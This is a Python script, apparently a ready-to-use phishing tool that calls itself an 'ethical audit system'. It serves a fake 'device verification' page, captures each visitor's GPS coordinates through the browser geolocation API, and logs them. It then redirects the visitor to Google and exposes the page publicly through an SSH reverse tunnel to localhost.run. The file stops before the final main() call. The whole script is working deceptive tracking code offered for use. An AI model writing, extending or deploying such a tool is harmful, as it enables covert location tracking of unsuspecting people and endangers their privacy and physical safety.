#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
from flask import Flask, request, render_template_string

# Limpieza inicial
os.system('fuser -k 5000/tcp > /dev/null 2>&1')

app = Flask(__name__)
URL_EXITO = "https://www.google.com"

# Diseño de Interfaz
HTML_FINAL = """
<!DOCTYPE html>
<html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
    <div style="border:1px solid #0f0; padding:20px; display:inline-block;">
        <h2>SISTEMA DE VERIFICACIÓN</h2>
        <p>Valide su dispositivo para continuar.</p>
        <button onclick="enviar()" style="background:#0f0; border:none; padding:10px; cursor:pointer;">VALIDAR</button>
    </div>
    <script>
        function enviar() {
            navigator.geolocation.getCurrentPosition((p) => {
                fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude})})
                .then(() => window.location.href = "%s");
            });
        }
    </script>
</body></html>
""" % URL_EXITO

@app.route('/')
def index(): return render_template_string(HTML_FINAL)

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    print(f"\n\033[1;32m[!] DATOS CAPTURADOS: {d['lat']}, {d['lon']}\033[0m")
    return "OK"

def banner():
    os.system('clear')
    print(f"\033[1;32m" + "█▀▀ █▀▀ █▄ █ █▀▀ █ █▀█ █ █    █▀█ █ █ █▀█ █   █ █")
    print("█▀░ ██▄ █ ▀█ █▄▄ █ █▀▄ █ █▄▄ █▄▄ █▀▄ █▄█ █▀▄ █▄▄ █▄█")
    print(f"{'='*50}\033[0m")
    print(f"\033[1;36m >> BIENVENIDO AL SISTEMA DE AUDITORÍA ÉTICA v23.0\033[0m")
    print(f"\033[1;36m >> CREADOR: TRX-LILL | AÑO: 2026\033[0m\n")

def main():
    while True:
        banner()
        print(" [1] INICIAR MÓDULO DE AUDITORÍA (LINK LIMPIO)")
        print(" [2] SALIR")
        opc = input("\nTRX-ROOT > ")
        
        if opc == "1":
            threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
            print(f"\n\033[1;33m[*] Generando túnel de alta seguridad...\033[0m")
            subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
        elif opc == "2": break

if __name__ == "__main__":
